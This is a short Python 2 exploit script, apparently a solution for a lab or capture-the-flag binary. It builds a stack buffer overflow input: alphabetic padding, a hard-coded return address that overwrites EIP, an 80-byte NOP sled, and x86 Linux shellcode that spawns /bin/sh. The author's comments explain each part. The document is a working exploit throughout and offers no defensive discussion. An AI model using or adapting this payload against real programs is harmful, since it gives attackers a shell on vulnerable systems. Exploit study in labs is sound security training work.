# wrote the following program in python 2

import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS" # The return address is overwritten by the character "T" so we fill the stack till the charater "S"
eip = struct.pack("I", 0xbffff7b0) # we overwrite the return address with this address which just shifts the program execution to the address after the return command
nopsled = "\x90"*80 # nopsled is used to overwrite all the env variables and stuff like that in order to handle the fact that the shell code might be anywhere in the stack after the base pointer
payload= "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" # this is the shell code which basically executes a shell
print (padding + eip + nopsled + payload) 
